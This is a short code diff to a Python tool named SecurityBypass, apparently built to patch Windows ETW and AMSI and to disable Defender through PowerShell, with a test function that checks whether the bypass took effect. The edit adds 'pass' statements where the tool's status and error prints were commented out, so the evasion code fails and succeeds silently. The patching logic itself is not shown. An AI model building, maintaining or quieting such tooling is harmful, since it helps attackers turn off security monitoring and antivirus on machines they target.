@@ -84,6 +84,7 @@ class SecurityBypass:
             return True
             
         except Exception as e:
+            pass
     # print(f"ETW patch failed: {e}")
             return False
     
@@ -124,6 +125,7 @@ class SecurityBypass:
             return True
             
         except Exception as e:
+            pass
     # print(f"AMSI patch failed: {e}")
             return False
     
@@ -155,6 +157,7 @@ class SecurityBypass:
                 return self._disable_defender_via_powershell()
                 
         except Exception as e:
+            pass
     # print(f"Defender disable failed: {e}")
             return False
     
@@ -414,8 +417,10 @@ def test_security_bypass():
             
             # Test if patches are applied
             if bypass.is_patched():
+                pass
     # print("✅ Patches applied successfully")
             else:
+                pass
     # print("⚠️ Patches may not be fully applied")
             
             # Test bypass effectiveness
@@ -423,6 +428,7 @@ def test_security_bypass():
     # print(f"Bypass test results: {results}")
             
     except Exception as e:
+        pass
     # print(f"❌ Security bypass test failed: {e}")
     
     # print("Security bypass test complete")
